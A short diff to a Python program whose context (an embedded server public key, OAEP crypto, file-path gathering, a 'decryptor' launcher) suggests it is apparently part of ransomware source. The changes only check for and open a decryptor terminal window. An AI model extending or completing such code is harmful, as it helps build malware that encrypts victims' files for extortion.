@@ -18,6 +18,7 @@ import pickle
 from Crypto.Hash import SHA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
+import subprocess
 
 # const variables
 server_public_key = ("""-----BEGIN PUBLIC KEY-----
@@ -54,11 +55,16 @@ def get_paths():
 
 
 def open_decryptor():
-    if(decryptor_process_exists):
+    process = subprocess.Popen("pidof decryptor", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = process.stdout.read() + process.stderr.read()
+    if(output):
         return
     
-    gnome = 'gnome-terminal --command ./decryptor'
+    gnome = 'gnome-terminal --command ./bin/decryptor'
+    os.system(gnome)
     xfce = 'xfce4-terminal --command=./decryptor'
+    os.system(xfce)
+    
     
 
 
